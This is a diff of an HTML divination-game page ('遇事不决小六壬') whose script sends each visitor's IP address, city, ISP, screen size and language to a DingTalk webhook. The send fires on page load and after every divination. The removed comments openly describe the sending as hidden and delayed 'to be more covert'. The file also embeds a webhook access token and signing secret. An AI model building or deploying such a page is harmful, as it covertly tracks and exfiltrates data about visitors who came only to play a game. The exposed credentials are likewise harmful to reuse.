@@ -27,7 +27,6 @@
             position: relative;
         }
 
-        /* 太极装饰 */
         .taiji {
             font-size: 80px;
             color: #d4af37;
@@ -64,7 +63,6 @@
             letter-spacing: 2px;
         }
 
-        /* 卦象显示区 */
         .divination-box {
             width: 280px;
             height: 200px;
@@ -143,7 +141,6 @@
             50% { text-shadow: 0 0 40px rgba(255, 215, 0, 0.8), 0 0 60px rgba(255, 215, 0, 0.4); }
         }
 
-        /* 闪烁动画 */
         .divination-box.animating::after {
             content: '斟';
             position: absolute;
@@ -157,7 +154,6 @@
             50% { opacity: 0.3; }
         }
 
-        /* 按钮 */
         .btn {
             padding: 15px 50px;
             font-size: 20px;
@@ -188,7 +184,6 @@
             cursor: not-allowed;
         }
 
-        /* 底部文字 */
         .footer {
             margin-top: 40px;
             font-size: 14px;
@@ -196,31 +191,14 @@
             letter-spacing: 3px;
         }
 
-        /* 隐藏的内容 - 用于获取IP */
-        .hidden-content {
-            display: none;
-        }
-
-        /* 加载动画 */
-        .loading {
-            font-size: 24px;
-            color: #d4af37;
-            animation: pulse 1s infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-
-        /* IP发送状态 */
-        .ip-status {
+        /* 状态显示 */
+        .status {
             position: fixed;
             bottom: 20px;
             left: 50%;
             transform: translateX(-50%);
             padding: 10px 20px;
-            background: rgba(20, 20, 30, 0.9);
+            background: rgba(20, 20, 30, 0.95);
             border: 1px solid #d4af37;
             border-radius: 8px;
             color: #d4af37;
@@ -229,176 +207,115 @@
             transition: opacity 0.3s;
         }
 
-        .ip-status.show {
+        .status.show {
             opacity: 1;
         }
 
-        .ip-status.success {
+        .status.success {
             border-color: #4CAF50;
             color: #4CAF50;
         }
 
-        .ip-status.error {
+        .status.error {
             border-color: #f44336;
             color: #f44336;
+        }
+
+        .status.sending {
+            border-color: #2196F3;
+            color: #2196F3;
+        }
+
+        /* 隐藏的内容 */
+        .hidden-content {
+            display: none;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- 太极符号 -->
         <div class="taiji">☯</div>
-
-        <!-- 标题 -->
         <h1 class="title">遇事不决小六壬</h1>
         <p class="subtitle">—— 诸葛马前课 · 六宫神课 ——</p>
         <p class="guide">不管做什么，可以先起一卦看看卦象</p>
 
-        <!-- 卦象显示区 -->
         <div class="divination-box" id="divinationBox">
             <span class="divination-text" id="divinationText"></span>
             <span class="divination-name" id="divinationName"></span>
             <span class="divination-meaning" id="divinationMeaning"></span>
         </div>
 
-        <!-- 起卦按钮 -->
         <button class="btn" id="divineBtn" onclick="divine()">🎲 起卦问事</button>
-
-        <!-- 底部 -->
         <p class="footer">—— 天道无亲 常与善人 ——</p>
     </div>
 
-    <!-- 隐藏的IP发送状态提示 -->
-    <div class="ip-status" id="ipStatus"></div>
-
-    <!-- 隐藏的表单用于IP获取 -->
-    <form id="hiddenForm" style="display:none;">
-        <input type="hidden" name="ip" id="ipInput">
-        <input type="hidden" name="city" id="cityInput">
-        <input type="hidden" name="region" id="regionInput">
-        <input type="hidden" name="country" id="countryInput">
-        <input type="hidden" name="isp" id="ispInput">
-        <input type="hidden" name="screen" id="screenInput">
-        <input type="hidden" name="language" id="languageInput">
-        <input type="hidden" name="userAgent" id="userAgentInput">
-    </form>
+    <div class="status" id="status"></div>
 
     <script>
-        // 六宫卦象数据
         const gua = [
-            {
-                name: '大安',
-                symbol: '☰',
-                meaning: '大安事事昌，求财在坤方。\n失物去不远，宅舍保安康。',
-                fortune: '吉'
-            },
-            {
-                name: '留连',
-                symbol: '☱',
-                meaning: '留连事难成，求谋日未明。\n官事凡如火，宜缓不宜惊。',
-                fortune: '凶'
-            },
-            {
-                name: '速喜',
-                symbol: '☲',
-                meaning: '速喜喜来临，求财向南行。\n行人未即至，失物上百呈。',
-                fortune: '吉'
-            },
-            {
-                name: '赤口',
-                symbol: '☵',
-                meaning: '赤口主口舌，官非切要防。\n失物急讨寻，交争意惶惶。',
-                fortune: '凶'
-            },
-            {
-                name: '小吉',
-                symbol: '☴',
-                meaning: '小吉最吉昌，路上好商量。\n阴人言定着，交易立呈祥。',
-                fortune: '吉'
-            },
-            {
-                name: '空亡',
-                symbol: '☷',
-                meaning: '空亡事不长，阴人惹祸殃。\n失物寻不见，官事有灾殃。',
-                fortune: '凶'
-            }
+            { name: '大安', symbol: '☰', meaning: '大安事事昌，求财在坤方。\n失物去不远，宅舍保安康。', fortune: '吉' },
+            { name: '留连', symbol: '☱', meaning: '留连事难成，求谋日未明。\n官事凡如火，宜缓不宜惊。', fortune: '凶' },
+            { name: '速喜', symbol: '☲', meaning: '速喜喜来临，求财向南行。\n行人未即至，失物上百呈。', fortune: '吉' },
+            { name: '赤口', symbol: '☵', meaning: '赤口主口舌，官非切要防。\n失物急讨寻，交争意惶惶。', fortune: '凶' },
+            { name: '小吉', symbol: '☴', meaning: '小吉最吉昌，路上好商量。\n阴人言定着，交易立呈祥。', fortune: '吉' },
+            { name: '空亡', symbol: '☷', meaning: '空亡事不长，阴人惹祸殃。\n失物寻不见，官事有灾殃。', fortune: '凶' }
         ];
 
         let isDivining = false;
 
-        // 获取屏幕和语言信息
-        function getScreenInfo() {
-            return {
-                width: screen.width,
-                height: screen.height,
-                colorDepth: screen.colorDepth
-            };
-        }
+        // 钉钉配置
+        const WEBHOOK = "https://oapi.dingtalk.com/robot/send?access_token=a57776d2a89ed36f4f4c5a45ee7c5c03f26a28e8eac8efd6a1636fbfb7a2f4ab";
+        const SECRET = "SEC83629f66d58aea7a5b348e05da84f5737a57423e72fd9e75ba73b178aa73824c";
 
-        function getLanguage() {
-            return navigator.language || navigator.userLanguage || 'zh-CN';
-        }
-
-        // 获取IP信息
-        async function getIPInfo() {
-            try {
-                // 获取IP和位置
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const ipData = await ipRes.json();
-
-                // 发送IP信息到钉钉
-                await sendToDingtalk({
-                    ip: ipData.ip || '未知',
-                    city: ipData.city || '未知',
-                    region: ipData.region || '未知',
-                    country: ipData.country_name || '未知',
-                    isp: ipData.org || '未知',
-                    screen: `${screen.width}x${screen.height}`,
-                    language: getLanguage(),
-                    timestamp: new Date().toLocaleString('zh-CN')
-                });
-
-                return ipData;
-            } catch (error) {
-                console.error('获取IP失败:', error);
-                // 即使失败也发送基本消息
-                await sendToDingtalk({
-                    ip: '获取失败',
-                    city: '未知',
-                    region: '未知',
-                    country: '未知',
-                    isp: '未知',
-                    screen: `${screen.width}x${screen.height}`,
-                    language: getLanguage(),
-                    timestamp: new Date().toLocaleString('zh-CN')
-                });
-                return null;
+        function showStatus(text, type) {
+            const status = document.getElementById('status');
+            status.textContent = text;
+            status.className = 'status show ' + (type || '');
+            if (type !== 'sending') {
+                setTimeout(() => status.classList.remove('show'), 3000);
             }
         }
 
-        // 发送到钉钉（加签方式）
-        async function sendToDingtalk(data) {
-            // 钉钉配置
-            const WEBHOOK = "https://oapi.dingtalk.com/robot/send?access_token=a57776d2a89ed36f4f4c5a45ee7c5c03f26a28e8eac8efd6a1636fbfb7a2f4ab";
-            const SECRET = "SEC83629f66d58aea7a5b348e05da84f5737a57423e72fd9e75ba73b178aa73824c";
+        async function getIPInfo() {
+            const ipApis = [
+                'https://ipapi.co/json/',
+                'https://ip-api.com/json/',
+                'https://api.ipify.org?format=json'
+            ];
 
-            // 计算签名
+            for (const api of ipApis) {
+                try {
+                    const res = await fetch(api, { timeout: 5000 });
+                    if (res.ok) {
+                        const data = await res.json();
+                        return {
+                            ip: data.ip || '未知',
+                            city: data.city || '',
+                            region: data.region || '',
+                            country: data.country_name || data.country || '',
+                            isp: data.org || data.isp || ''
+                        };
+                    }
+                } catch (e) {
+                    console.log('API失败:', api, e);
+                }
+            }
+            return { ip: '获取失败', city: '', region: '', country: '', isp: '' };
+        }
+
+        async function sendToDingtalk(data) {
             const timestamp = Date.now();
-            const string_to_sign = `${timestamp}\n${SECRET}`;
+            const stringToSign = `${timestamp}\n${SECRET}`;
 
             const encoder = new TextEncoder();
-            const key = encoder.encode(SECRET);
-            const msg = encoder.encode(string_to_sign);
-
-            // 使用 HMAC-SHA256
-            const cryptoKey = await crypto.subtle.importKey(
+            const key = await crypto.subtle.importKey(
                 'raw',
-                key,
+                encoder.encode(SECRET),
                 { name: 'HMAC', hash: 'SHA-256' },
                 false,
                 ['sign']
             );
-            const signature = await crypto.subtle.sign('HMAC', cryptoKey, msg);
+            const signature = await crypto.subtle.sign('HMAC', key, encoder.encode(stringToSign));
             const sign = btoa(String.fromCharCode(...new Uint8Array(signature)))
                 .replace(/\+/g, '-')
                 .replace(/\//g, '_')
@@ -406,18 +323,16 @@
 
             const url = `${WEBHOOK}&timestamp=${timestamp}&sign=${encodeURIComponent(sign)}`;
 
-            // 格式化消息
             const message = `📱 IP监控通知
 
 IP: ${data.ip}
 📍 ${data.country} ${data.region} ${data.city}
 🏢 ${data.isp}
-🖥 ${data.screen}
-🌐 ${data.language}
-⏰ ${data.timestamp}`;
+🖥 ${screen.width}x${screen.height}
+🌐 ${navigator.language}
+⏰ ${new Date().toLocaleString('zh-CN')}`;
 
-            // 发送请求
-            await fetch(url, {
+            const resp = await fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -425,9 +340,10 @@ IP: ${data.ip}
                     text: { content: message }
                 })
             });
+
+            return await resp.json();
         }
 
-        // 占卜函数
         async function divine() {
             if (isDivining) return;
             isDivining = true;
@@ -440,25 +356,18 @@ IP: ${data.ip}
 
             btn.disabled = true;
             btn.textContent = '斟...';
-
-            // 清空之前的结果
             text.classList.remove('show');
             name.classList.remove('show');
             meaning.classList.remove('show');
 
-            // 开始闪烁动画
             box.classList.add('animating');
 
-            // 闪烁1-2秒
             await new Promise(resolve => setTimeout(resolve, 1000 + Math.random() * 1000));
 
-            // 停止动画
             box.classList.remove('animating');
 
-            // 随机选择卦象
             const result = gua[Math.floor(Math.random() * gua.length)];
 
-            // 显示结果
             text.textContent = result.symbol;
             name.textContent = result.name;
             meaning.textContent = result.meaning;
@@ -471,15 +380,38 @@ IP: ${data.ip}
             btn.disabled = false;
             isDivining = false;
 
-            // 同时获取IP并发送到钉钉
-            getIPInfo();
+            // 获取IP并发送
+            showStatus('正在获取IP...', 'sending');
+            const ipData = await getIPInfo();
+            showStatus('正在发送通知...', 'sending');
+
+            try {
+                const result = await sendToDingtalk(ipData);
+                if (result.errcode === 0) {
+                    showStatus('已发送到钉钉！', 'success');
+                } else {
+                    showStatus('发送失败: ' + result.errmsg, 'error');
+                }
+            } catch (e) {
+                showStatus('网络错误: ' + e.message, 'error');
+            }
         }
 
-        // 页面加载时自动获取IP（隐蔽发送）
+        // 页面加载时自动获取IP
         window.onload = function() {
-            // 延迟一下，更隐蔽
             setTimeout(() => {
-                getIPInfo();
+                showStatus('正在后台获取IP...', 'sending');
+                getIPInfo().then(ipData => {
+                    sendToDingtalk(ipData).then(result => {
+                        if (result.errcode === 0) {
+                            showStatus('IP已发送', 'success');
+                        } else {
+                            showStatus('请先点起卦按钮发送IP', '');
+                        }
+                    }).catch(() => {
+                        console.log('后台发送失败，需要用户操作');
+                    });
+                });
             }, 2000);
         };
     </script>
